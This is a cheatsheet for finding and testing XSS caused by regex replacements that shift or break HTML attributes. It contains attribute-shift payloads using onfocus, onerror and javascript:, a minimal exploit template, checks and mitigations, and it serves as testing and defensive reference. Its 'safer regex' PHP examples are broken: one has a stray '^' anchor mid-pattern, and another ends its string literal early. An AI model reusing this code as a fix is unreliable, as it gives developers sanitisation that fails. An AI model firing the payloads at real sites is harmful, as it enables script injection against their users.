### Regex XSS (REGEXSS) Cheatsheet

Quick reference for spotting and testing regex-based HTML breakage that can lead to XSS. Inspired by Stealthcopter’s write-up: [REGEXSS: How .* Turned Into over $6k in Bounties](https://sec.stealthcopter.com/regexss/#).

---

## Red-flag regex shapes
- `<attr>\s*=\s*".*?"` or `<attr>\s*=\s*'.*?'`
- `data-[\w-]+\s*=\s*["'][^"']*["']`
- `itemprop\=\"(.*?)\"` (real-world example)
- Any `String.replace(/.../g, '')` or `preg_replace('/.../', '', $content)` that targets HTML attributes with greedy tokens: `.*`, `.*?`, `[^"']*`.

Notes
- Lazy quantifier `.*?` still crosses attribute and sometimes element boundaries in messy HTML.
- Mixed single/double quotes increase exploitability.

---

## Test payloads (attribute shift)
- Start shift
  - Input: `<a href="attribute=" title="javascript:alert(1)">t</a>`
  - Goal: Replacement begins inside `href` value and ends at next quote, promoting `javascript:`.

- End shift (mixed quotes)
  - Input: `<a title='attribute="' href="new title' onfocus=alert(1) x='y'">t</a>`
  - Goal: Mixed quotes extend match; `onfocus` becomes active attr.

- Cross-element/content (last resort)
  - Input: `<img src='attribute="">"x' onerror="alert(1)">`
  - Goal: Leave `onerror` active while collapsing preceding value.

See `XSS/wordlists/*regexss*` for ready-to-copy variants.

---

## Verification steps
1) Ensure regex runs after sanitizer. If before, exploit may fail or become harder.
2) Observe HTML diff pre/post replacement. Look for attribute promotion or broken quoting.
3) Trigger via focus/click/load as needed (`tabindex=1`, `autofocus`).

---

## Safe fixes
- Replace regex HTML surgery with a parser (`DOMParser`, `DOMDocument`, `WP_HTML_Tag_Processor`).
- If you must use regex, target exact attributes and avoid greedy classes; normalize quotes first.

---

## Minimal exploit proof template
Input:
```
<a href='https://example.test/?attr="' title="' onfocus=alert(1) tabindex=1 x=1">link</a>
```
Vulnerable replacement:
```
preg_replace('/attr\=".*?"/', '', $content);
```
After:
```
<a href='https://example.test/?' onfocus=alert(1) tabindex=1 x=1>link</a>
```

Reference: [Stealthcopter’s article](https://sec.stealthcopter.com/regexss/#)


---

## Clarifications and caveats
1) Lazy still crosses boundaries if started inside a value: where the match begins is critical. If the engine starts matching inside an attribute value, a lazy `.*?` will still stop at the next quote, which may be the start of the next attribute value.
2) Sanitiser order matters: full exploitation typically requires the greedy regex to run after sanitisation/normalisation. If the regex runs first and a robust sanitizer runs after, the promoted attribute may be removed.
3) Context sensitivity: `on*` attributes (onerror/onfocus/onclick) are highest risk; `javascript:` in `href` often needs a user interaction unless combined with other behaviours.
4) Regex can be acceptable for tiny, well-defined tasks only when strictly constrained. Prefer parsers wherever possible.

---

## Safer regex patterns (last resort)
If you cannot use a parser, reduce risk with conservative patterns. These do not guarantee safety and assume reasonably well‑formed HTML.

Normalize quotes first (recommended): convert all attribute quotes to a single style to reduce mixed-quote abuse.

Constrain to quoted values without crossing quotes (PHP/PCRE example):
```php
// matches attr="...no quotes inside..." (single line)
$re = '/\battr\s*=\s*([\'\"])^[^\'\"]*\1/i';
$content = preg_replace($re, '', $content);
```

Be exact about allowed characters (e.g., conservative URL attr):
```php
// safer for URLs: allow only conservative URL characters
$re = '/\bhref\s*=\s*([\'\"])'[A-Za-z0-9\-._~:\/?#\[\]@!$&'()*+,;=%]*'\1/i';
```

Do not attempt to remove arbitrary attributes with a greedy expression like `attribute=".*?"`.

---

## Quick testing checklist
- Confirm whether quotes are normalised (single→double) or mixed; mixed enables easier exploitation.
- Determine whether the vulnerable replacement runs before or after sanitisation.
- Try start‑shift and mixed‑quote end‑shift payloads; add `tabindex=1`, `autofocus`, `onfocus`/`onerror` to trigger.
- View pre/post HTML diff and confirm attribute promotion or broken quoting.

---

## Extra mitigations
- Apply a strict Content Security Policy (CSP) as defense‑in‑depth to reduce impact of inline handlers or `javascript:` URLs.
- Use well‑maintained sanitizers/parsers (DOMPurify, DOMParser, DOMDocument, WP_HTML_Tag_Processor) instead of regex HTML surgery.

